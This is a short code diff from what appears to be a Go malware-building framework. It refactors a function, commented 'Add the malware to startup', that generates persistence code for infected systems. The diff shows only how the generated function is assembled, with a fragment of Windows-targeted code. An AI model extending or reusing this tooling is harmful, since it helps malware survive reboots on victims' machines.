@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 )
 
 // Add the malware to startup
@@ -11,7 +12,7 @@ func Add(s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "Add_startup"
 
-	body := []string{fmt.Sprintf("func %s(){", function_call)}
+	body := []string{}
 
 	if data_object.Target_os == "windows" {
 		body = append(body, "malware_path, _ := spine.path",
@@ -59,8 +60,9 @@ func Add(s_json string) ([]string, string) {
 		data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 	}
 
-	body = append(body, "}")
-	data_object.Add_go_function(body)
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{""},
+		Gut:        body})
 
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("bufio")
